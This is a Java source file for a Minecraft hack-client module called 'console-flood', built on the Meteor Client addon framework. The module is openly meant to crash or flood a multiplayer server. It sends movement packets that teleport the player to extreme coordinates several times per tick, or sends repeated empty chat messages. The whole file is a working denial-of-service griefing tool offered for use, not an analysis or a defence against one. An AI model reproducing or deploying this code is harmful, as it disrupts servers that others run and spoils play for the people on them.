package uwu.taxevasion.allahhack.modules;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import uwu.taxevasion.allahhack.Allah;

public class ConsoleFlood extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final Setting<Modes> mode = sgGeneral.add(new EnumSetting.Builder<Modes>()
        .name("mode")
        .description("how to crash")
        .defaultValue(Modes.Movement)
        .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("packets/tick")
        .defaultValue(1)
        .sliderRange(1, 20)
        .visible(() -> mode.get() != Modes.Chat)
        .build()
    );

    public ConsoleFlood() {
        super(Allah.CATEGORY, "console-flood", "floods the console");
    }

    int timer = 0;

    @EventHandler
    private void onTick(TickEvent.Post event) {
        switch (mode.get()) {
            case Movement -> {
                for (int i = 0; i < amount.get(); i++) {
                    mc.player.setPos(1333333337, 1333333337, 1333333337);
                }
            }
            case Chat -> {
                if (mc.player.hasPermissionLevel(4)) {
                    for (int i = 0; i < amount.get(); i++) {
                        mc.player.sendChatMessage("");
                    }
                } else {
                    timer++;
                    if (timer == 10) {
                        mc.player.sendChatMessage("");
                        timer = 0;
                    }
                }
            }
        }
    }
    public enum Modes {
        Movement, Chat
    }
}
